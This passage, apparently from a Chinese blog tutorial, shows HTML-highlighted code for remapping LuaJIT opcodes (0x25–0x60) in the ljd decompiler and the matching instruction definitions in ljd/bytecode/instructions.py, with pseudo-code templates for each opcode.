class="number">0x25</span><span class="punctuation">,</span> instructions.ADDNV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x26</span><span class="punctuation">,</span> instructions.SUBNV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x27</span><span class="punctuation">,</span> instructions.MULNV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x28</span><span class="punctuation">,</span> instructions.DIVNV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x29</span><span class="punctuation">,</span> instructions.MODNV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x2a</span><span class="punctuation">,</span> instructions.ADDVV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x2b</span><span class="punctuation">,</span> instructions.SUBVV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x2c</span><span class="punctuation">,</span> instructions.MULVV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x2d</span><span class="punctuation">,</span> instructions.DIVVV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x2e</span><span class="punctuation">,</span> instructions.MODVV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x2f</span><span class="punctuation">,</span> instructions.POW)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x30</span><span class="punctuation">,</span> instructions.CAT)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x31</span><span class="punctuation">,</span> instructions.UGET)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x32</span><span class="punctuation">,</span> instructions.USETV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x33</span><span class="punctuation">,</span> instructions.USETS)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x34</span><span class="punctuation">,</span> instructions.USETN)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x35</span><span class="punctuation">,</span> instructions.USETP)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x36</span><span class="punctuation">,</span> instructions.UCLO)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x37</span><span class="punctuation">,</span> instructions.FNEW)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x38</span><span class="punctuation">,</span> instructions.TNEW)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x39</span><span class="punctuation">,</span> instructions.TDUP)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x3a</span><span class="punctuation">,</span> instructions.GGET)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x3b</span><span class="punctuation">,</span> instructions.GSET)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x3c</span><span class="punctuation">,</span> instructions.TGETV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x3d</span><span class="punctuation">,</span> instructions.TGETS)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x3e</span><span class="punctuation">,</span> instructions.TGETB)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x3f</span><span class="punctuation">,</span> instructions.TGETR)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x40</span><span class="punctuation">,</span> instructions.TSETV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x41</span><span class="punctuation">,</span> instructions.TSETS)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x42</span><span class="punctuation">,</span> instructions.TSETB)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x43</span><span class="punctuation">,</span> instructions.TSETM)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x44</span><span class="punctuation">,</span> instructions.TSETR)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x45</span><span class="punctuation">,</span> instructions.CALLM)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x46</span><span class="punctuation">,</span> instructions.CALL)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x47</span><span class="punctuation">,</span> instructions.CALLMT)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x48</span><span class="punctuation">,</span> instructions.CALLT)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x49</span><span class="punctuation">,</span> instructions.ITERC)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x4a</span><span class="punctuation">,</span> instructions.ITERN)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x4b</span><span class="punctuation">,</span> instructions.VARG)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x4c</span><span class="punctuation">,</span> instructions.ISNEXT)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x4d</span><span class="punctuation">,</span> instructions.FORI)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x4e</span><span class="punctuation">,</span> instructions.JFORI)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x4f</span><span class="punctuation">,</span> instructions.FORL)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x50</span><span class="punctuation">,</span> instructions.IFORL)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x51</span><span class="punctuation">,</span> instructions.JFORL)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x52</span><span class="punctuation">,</span> instructions.ITERL)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x53</span><span class="punctuation">,</span> instructions.IITERL)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x54</span><span class="punctuation">,</span> instructions.JITERL)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x55</span><span class="punctuation">,</span> instructions.LOOP)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x56</span><span class="punctuation">,</span> instructions.ILOOP)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x57</span><span class="punctuation">,</span> instructions.JLOOP)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x58</span><span class="punctuation">,</span> instructions.JMP)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x59</span><span class="punctuation">,</span> instructions.FUNCF)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x5a</span><span class="punctuation">,</span> instructions.IFUNCF)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x5b</span><span class="punctuation">,</span> instructions.JFUNCF)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x5c</span><span class="punctuation">,</span> instructions.FUNCV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x5d</span><span class="punctuation">,</span> instructions.IFUNCV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x5e</span><span class="punctuation">,</span> instructions.JFUNCV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x5f</span><span class="punctuation">,</span> instructions.FUNCC)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x60</span><span class="punctuation">,</span> instructions.FUNCCW)</span><br></pre></td></tr></table></figure>

<p>2、修改ljd&#x2F;bytecode&#x2F;instructions.py的第97行开始，按照1的函数顺序</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line">ISLT = _IDef(<span class="string">&quot;ISLT&quot;</span>, 		T_VAR, 	None, 	T_VAR, 	<span class="string">&quot;if &#123;A&#125; &lt; &#123;D&#125;&quot;</span>)</span><br><span class="line">ISGE = _IDef(<span class="string">&quot;ISGE&quot;</span>, 		T_VAR, 	None, 	T_VAR, 	<span class="string">&quot;if &#123;A&#125; &gt;= &#123;D&#125;&quot;</span>)</span><br><span class="line">ISLE = _IDef(<span class="string">&quot;ISLE&quot;</span>, 		T_VAR, 	None, 	T_VAR, 	<span class="string">&quot;if &#123;A&#125; &lt;= &#123;D&#125;&quot;</span>)</span><br><span class="line">ISGT = _IDef(<span class="string">&quot;ISGT&quot;</span>, 		T_VAR, 	None, 	T_VAR, 	<span class="string">&quot;if &#123;A&#125; &gt; &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ISEQV = _IDef(<span class="string">&quot;ISEQV&quot;</span>, 		T_VAR, 	None, 	T_VAR, 	<span class="string">&quot;if &#123;A&#125; == &#123;D&#125;&quot;</span>)</span><br><span class="line">ISNEV = _IDef(<span class="string">&quot;ISNEV&quot;</span>, 		T_VAR, 	None, 	T_VAR, 	<span class="string">&quot;if &#123;A&#125; ~= &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ISEQS = _IDef(<span class="string">&quot;ISEQS&quot;</span>, 		T_VAR, 	None, 	T_STR, 	<span class="string">&quot;if &#123;A&#125; == &#123;D&#125;&quot;</span>)</span><br><span class="line">ISNES = _IDef(<span class="string">&quot;ISNES&quot;</span>, 		T_VAR, 	None, 	T_STR, 	<span class="string">&quot;if &#123;A&#125; ~= &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ISEQN = _IDef(<span class="string">&quot;ISEQN&quot;</span>, 		T_VAR, 	None, 	T_NUM, 	<span class="string">&quot;if &#123;A&#125; == &#123;D&#125;&quot;</span>)</span><br><span class="line">ISNEN = _IDef(<span class="string">&quot;ISNEN&quot;</span>, 		T_VAR, 	None, 	T_NUM, 	<span class="string">&quot;if &#123;A&#125; ~= &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ISEQP = _IDef(<span class="string">&quot;ISEQP&quot;</span>, 		T_VAR, 	None, 	T_PRI, 	<span class="string">&quot;if &#123;A&#125; == &#123;D&#125;&quot;</span>)</span><br><span class="line">ISNEP = _IDef(<span class="string">&quot;ISNEP&quot;</span>, 		T_VAR, 	None, 	T_PRI, 	<span class="string">&quot;if &#123;A&#125; ~= &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"># Constant ops.</span><br><span class="line"></span><br><span class="line">KSTR = _IDef(<span class="string">&quot;KSTR&quot;</span>, 		T_DST, 	None, 	T_STR, 	<span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line">KCDATA = _IDef(<span class="string">&quot;KCDATA&quot;</span>, 	T_DST, 	None, 	T_CDT, 	<span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line">KSHORT = _IDef(<span class="string">&quot;KSHORT&quot;</span>, 	T_DST, 	None, 	T_SLIT, <span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line">KNUM = _IDef(<span class="string">&quot;KNUM&quot;</span>, 		T_DST, 	None, 	T_NUM, 	<span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line">KPRI = _IDef(<span class="string">&quot;KPRI&quot;</span>, 		T_DST, 	None, 	T_PRI, 	<span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">KNIL = _IDef(<span class="string">&quot;KNIL&quot;</span>, 		T_BS, 	None, 	T_BS, 	<span class="string">&quot;&#123;from_A_to_D&#125; = nil&quot;</span>)</span><br><span class="line"></span><br><span class="line"># Unary test <span class="keyword">and</span> copy ops</span><br><span class="line"></span><br><span class="line">ISTC = _IDef(<span class="string">&quot;ISTC&quot;</span>, 		T_DST, 	None, 	T_VAR, 	<span class="string">&quot;&#123;A&#125; = &#123;D&#125;; if &#123;D&#125;&quot;</span>)</span><br><span class="line">ISFC = _IDef(<span class="string">&quot;ISFC&quot;</span>, 		T_DST, 	None, 	T_VAR, 	<span class="string">&quot;&#123;A&#125; = &#123;D&#125;; if not &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">IST = _IDef(<span class="string">&quot;IST&quot;</span>, 		None, 	None, 	T_VAR, 	<span class="string">&quot;if &#123;D&#125;&quot;</span>)</span><br><span class="line">ISF = _IDef(<span class="string">&quot;ISF&quot;</span>, 		None, 	None, 	T_VAR, 	<span class="string">&quot;if not &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ISTYPE = _IDef(<span class="string">&quot;ISTYPE&quot;</span>, 	T_VAR, 	None, 	T_LIT, 	<span class="string">&quot;ISTYPE unknow&quot;</span>)</span><br><span class="line">ISNUM = _IDef(<span class="string">&quot;ISNUM&quot;</span>, 		T_VAR, 	None, 	T_LIT, 	<span class="string">&quot;ISNUM unknow&quot;</span>)</span><br><span class="line"># Unary ops</span><br><span class="line"></span><br><span class="line">MOV = _IDef(<span class="string">&quot;MOV&quot;</span>, 		T_DST, 	None, 	T_VAR, 	<span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line">NOT = _IDef(<span class="string">&quot;NOT&quot;</span>, 		T_DST, 	None, 	T_VAR, 	<span class="string">&quot;&#123;A&#125; = not &#123;D&#125;&quot;</span>)</span><br><span class="line">UNM = _IDef(<span class="string">&quot;UNM&quot;</span>, 		T_DST, 	None, 	T_VAR, 	<span class="string">&quot;&#123;A&#125; = -&#123;D&#125;&quot;</span>)</span><br><span class="line">LEN = _IDef(<span class="string">&quot;LEN&quot;</span>, 		T_DST, 	None, 	T_VAR, 	<span class="string">&quot;&#123;A&#125; = #&#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"># Returns.</span><br><span class="line"></span><br><span class="line">RETM = _IDef(<span class="string">&quot;RETM&quot;</span>, 		T_BS, 	None, 	T_LIT,</span><br><span class="line">		<span class="string">&quot;return &#123;from_A_x_D_minus_one&#125;, ...MULTRES&quot;</span>)</span><br><span class="line"></span><br><span class="line">RET = _IDef(<span class="string">&quot;RET&quot;</span>, 	 	T_RBS, 	None, 	T_LIT,</span><br><span class="line">		<span class="string">&quot;return &#123;from_A_x_D_minus_two&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">RET0 = _IDef(<span class="string">&quot;RET0&quot;</span>, 		T_RBS, 	None, 	T_LIT, 	<span class="string">&quot;return&quot;</span>)</span><br><span class="line">RET1 = _IDef(<span class="string">&quot;RET1&quot;</span>, 		T_RBS, 	None, 	T_LIT, 	<span class="string">&quot;return &#123;A&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"># Binary ops</span><br><span class="line"></span><br><span class="line">ADDVN = _IDef(<span class="string">&quot;ADDVN&quot;</span>, 		T_DST, 	T_VAR, 	T_NUM, 	<span class="string">&quot;&#123;A&#125; = &#123;B&#125; + &#123;C&#125;&quot;</span>)</span><br><span class="line">SUBVN = _IDef(<span class="string">&quot;SUBVN&quot;</span>, 		T_DST, 	T_VAR, 	T_NUM, 	<span class="string">&quot;&#123;A&#125; = &#123;B&#125; - &#123;C&#125;&quot;</span>)</span><br><span class="line">MULVN = _IDef(<span class="string">&quot;MULVN&quot;</span>, 		T_DST, 	T_VAR, 	T_NUM, 	<span class="string">&quot;&#123;A&#125; = &#123;B&#125; * &#123;C&#125;&quot;</span>)</span><br><span class="line">DIVVN = _IDef(<span class="string">&quot;DIVVN&quot;</span>, 		T_DST, 	T_VAR, 	T_NUM, 	<span class="string">&quot;&#123;A&#125; = &#123;B&#125; / &#123;C&#125;&quot;</span>)</span><br><span class="line">MODVN = _IDef(<span class="string">&quot;MODVN&quot;</span>, 		T_DST, 	T_VAR, 	T_NUM, 	<span class="string">&quot;&#123;A&#125; = &#123;B&#125; % &#123;C&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ADDNV = _IDef(<span class="string">&quot;ADDNV&quot;</span>, 		T_DST, 	T_VAR, 	T_NUM, 	<span class="string">&quot;&#123;A&#125; = &#123;C&#125; + &#123;B&#125;&quot;</span>)</span><br><span class="line">SUBNV = _IDef(<span class="string">&quot;SUBNV&quot;</span>, 		T_DST, 	T_VAR, 	T_NUM, 	<span class="string">&quot;&#123;A&#125; = &#123;C&#125; - &#123;B&#125;&quot;</span>)</span><br><span class="line">MULNV = _IDef(<span class="string">&quot;MULNV&quot;</span>, 		T_DST, 	T_VAR, 	T_NUM, 	<span class="string">&quot;&#123;A&#125; = &#123;C&#125; * &#123;B&#125;&quot;</span>)</span><br><span class="line">DIVNV = _IDef(<span class="string">&quot;DIVNV&quot;</span>, 		T_DST, 	T_VAR, 	T_NUM, 	<span class="string">&quot;&#123;A&#125; = &#123;C&#125; / &#123;B&#125;&quot;</span>)</span><br><span class="line">MODNV = _IDef(<span class="string">&quot;MODNV&quot;</span>, 		T_DST, 	T_VAR, 	T_NUM, 	<span class="string">&quot;&#123;A&#125; = &#123;C&#125; % &#123;B&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ADDVV = _IDef(<span class="string">&quot;ADDVV&quot;</span>, 		T_DST, 	T_VAR, 	T_VAR, 	<span class="string">&quot;&#123;A&#125; = &#123;B&#125; + &#123;C&#125;&quot;</span>)</span><br><span class="line">SUBVV = _IDef(<span class="string">&quot;SUBVV&quot;</span>, 		T_DST, 	T_VAR, 	T_VAR, 	<span class="string">&quot;&#123;A&#125; = &#123;B&#125; - &#123;C&#125;&quot;</span>)</span><br><span class="line">MULVV = _IDef(<span class="string">&quot;MULVV&quot;</span>, 		T_DST, 	T_VAR, 	T_VAR, 	<span class="string">&quot;&#123;A&#125; = &#123;B&#125; * &#123;C&#125;&quot;</span>)</span><br><span class="line">DIVVV = _IDef(<span class="string">&quot;DIVVV&quot;</span>, 		T_DST, 	T_VAR, 	T_VAR, 	<span class="string">&quot;&#123;A&#125; = &#123;B&#125; / &#123;C&#125;&quot;</span>)</span><br><span class="line">MODVV = _IDef(<span class="string">&quot;MODVV&quot;</span>, 		T_DST, 	T_VAR, 	T_VAR, 	<span class="string">&quot;&#123;A&#125; = &#123;B&#125; % &#123;C&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">POW = _IDef(<span class="string">&quot;POW&quot;</span>, 		T_DST, 	T_VAR, 	T_VAR, 	<span class="string">&quot;&#123;A&#125; = &#123;B&#125; ^ &#123;C&#125; (pow)&quot;</span>)</span><br><span class="line">CAT = _IDef(<span class="string">&quot;CAT&quot;</span>, 		T_DST, 	T_RBS, 	T_RBS,</span><br><span class="line">		<span class="string">&quot;&#123;A&#125; = &#123;concat_from_B_to_C&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"># Upvalue <span class="keyword">and</span> <span class="function"><span class="keyword">function</span> <span class="title">ops</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">UGET</span> = <span class="title">_IDef</span><span class="params">(&quot;UGET&quot;, 		T_DST, 	None, 	T_UV, 	&quot;&#123;A&#125; = &#123;D&#125;&quot;)</span></span></span><br><span class="line"></span><br><span class="line">USETV = _IDef(<span class="string">&quot;USETV&quot;</span>, 		T_UV, 	None, 	T_VAR, 	<span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line">USETS = _IDef(<span class="string">&quot;USETS&quot;</span>, 		T_UV, 	None, 	T_STR, 	<span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line">USETN = _IDef(<span class="string">&quot;USETN&quot;</span>, 		T_UV, 	None, 	T_NUM, 	<span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line">USETP = _IDef(<span class="string">&quot;USETP&quot;</span>, 		T_UV, 	None, 	T_PRI, 	<span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">UCLO = _IDef(<span class="string">&quot;UCLO&quot;</span>, 		T_RBS, 	None, 	T_JMP,</span><br><span class="line">		<span class="string">&quot;nil uvs &gt;= &#123;A&#125;; goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">FNEW = _IDef(<span class="string">&quot;FNEW&quot;</span>, 		T_DST, 	None, 	T_FUN, 	<span class="string">&quot;&#123;A&#125; = function &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"># Table ops.</span><br><span class="line"></span><br><span class="line">TNEW = _IDef(<span class="string">&quot;TNEW&quot;</span>, 		T_DST, 	None, 	T_LIT, 	<span class="string">&quot;&#123;A&#125; = new table(&quot;</span></span><br><span class="line">							<span class="string">&quot; array: &#123;D_array&#125;,&quot;</span></span><br><span class="line">							<span class="string">&quot; dict: &#123;D_dict&#125;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">TDUP = _IDef(<span class="string">&quot;TDUP&quot;</span>, 		T_DST, 	None, 	T_TAB, 	<span class="string">&quot;&#123;A&#125; = copy &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">GGET = _IDef(<span class="string">&quot;GGET&quot;</span>, 		T_DST, 	None, 	T_STR, 	<span class="string">&quot;&#123;A&#125; = _env[&#123;D&#125;]&quot;</span>)</span><br><span class="line">GSET = _IDef(<span class="string">&quot;GSET&quot;</span>, 		T_VAR, 	None, 	T_STR, 	<span class="string">&quot;_env[&#123;D&#125;] = &#123;A&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">TGETV = _IDef(<span class="string">&quot;TGETV&quot;</span>, 		T_DST, 	T_VAR, 	T_VAR, 	<span class="string">&quot;&#123;A&#125; = &#123;B&#125;[&#123;C&#125;]&quot;</span>)</span><br><span class="line">TGETS = _IDef(<span class="string">&quot;TGETS&quot;</span>, 		T_DST, 	T_VAR, 	T_STR, 	<span class="string">&quot;&#123;A&#125; = &#123;B&#125;.&#123;C&#125;&quot;</span>)</span><br><span class="line">TGETB = _IDef(<span class="string">&quot;TGETB&quot;</span>, 		T_DST, 	T_VAR, 	T_LIT, 	<span class="string">&quot;&#123;A&#125; = &#123;B&#125;[&#123;C&#125;]&quot;</span>)</span><br><span class="line">TGETR = _IDef(<span class="string">&quot;TGETR&quot;</span>, 		T_DST, 	T_VAR, 	T_VAR, 	<span class="string">&quot;unkown TGETR&quot;</span>)</span><br><span class="line"></span><br><span class="line">TSETV = _IDef(<span class="string">&quot;TSETV&quot;</span>, 		T_VAR, 	T_VAR, 	T_VAR, 	<span class="string">&quot;&#123;B&#125;[&#123;C&#125;] = &#123;A&#125;&quot;</span>)</span><br><span class="line">TSETS = _IDef(<span class="string">&quot;TSETS&quot;</span>, 		T_VAR, 	T_VAR, 	T_STR, 	<span class="string">&quot;&#123;B&#125;.&#123;C&#125; = &#123;A&#125;&quot;</span>)</span><br><span class="line">TSETB = _IDef(<span class="string">&quot;TSETB&quot;</span>, 		T_VAR, 	T_VAR, 	T_LIT, 	<span class="string">&quot;&#123;B&#125;[&#123;C&#125;] = &#123;A&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">TSETM = _IDef(<span class="string">&quot;TSETM&quot;</span>, 	 	T_BS, 	None, 	T_NUM,</span><br><span class="line">		<span class="string">&quot;for i = 0, MULTRES, 1 do&quot;</span></span><br><span class="line">		<span class="string">&quot; &#123;A_minus_one&#125;[&#123;D_low&#125; + i] = slot(&#123;A&#125; + i)&quot;</span>)</span><br><span class="line"></span><br><span class="line">TSETR = _IDef(<span class="string">&quot;TSETR&quot;</span>, 		T_VAR, 	T_VAR, 	T_VAR, 	<span class="string">&quot;unkow TSETR&quot;</span>)</span><br><span class="line"># Calls <span class="keyword">and</span> vararg handling. T = tail call.</span><br><span class="line"></span><br><span class="line">CALLM = _IDef(<span class="string">&quot;CALLM&quot;</span>, 		T_BS, 	T_LIT, 	T_LIT,</span><br><span class="line">		<span class="string">&quot;&#123;from_A_x_B_minus_two&#125; = &#123;A&#125;(&#123;from_A_plus_one_x_C&#125;, ...MULTRES)&quot;</span>)</span><br><span class="line"></span><br><span class="line">CALL = _IDef(<span class="string">&quot;CALL&quot;</span>, 		T_BS, 	T_LIT, 	T_LIT,</span><br><span class="line">		<span class="string">&quot;&#123;from_A_x_B_minus_two&#125; = &#123;A&#125;(&#123;from_A_plus_one_x_C_minus_one&#125;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">CALLMT = _IDef(<span class="string">&quot;CALLMT&quot;</span>, 	T_BS, 	None, 	T_LIT,</span><br><span class="line">		<span class="string">&quot;return &#123;A&#125;(&#123;from_A_plus_one_x_D&#125;, ...MULTRES)&quot;</span>)</span><br><span class="line"></span><br><span class="line">CALLT = _IDef(<span class="string">&quot;CALLT&quot;</span>, 		T_BS, 	None, 	T_LIT,</span><br><span class="line">		<span class="string">&quot;return &#123;A&#125;(&#123;from_A_plus_one_x_D_minus_one&#125;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">ITERC = _IDef(<span class="string">&quot;ITERC&quot;</span>, 		T_BS, 	T_LIT, 	T_LIT,</span><br><span class="line">		<span class="string">&quot;&#123;A&#125;, &#123;A_plus_one&#125;, &#123;A_plus_two&#125; =&quot;</span></span><br><span class="line">			<span class="string">&quot; &#123;A_minus_three&#125;, &#123;A_minus_two&#125;, &#123;A_minus_one&#125;;&quot;</span></span><br><span class="line">		<span class="string">&quot; &#123;from_A_x_B_minus_two&#125; =&quot;</span></span><br><span class="line">			<span class="string">&quot; &#123;A_minus_three&#125;(&#123;A_minus_two&#125;, &#123;A_minus_one&#125;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">ITERN = _IDef(<span class="string">&quot;ITERN&quot;</span>, 		T_BS, 	T_LIT, 	T_LIT,</span><br><span class="line">		<span class="string">&quot;&#123;A&#125;, &#123;A_plus_one&#125;, &#123;A_plus_two&#125; =&quot;</span></span><br><span class="line">			<span class="string">&quot; &#123;A_minus_three&#125;, &#123;A_minus_two&#125;, 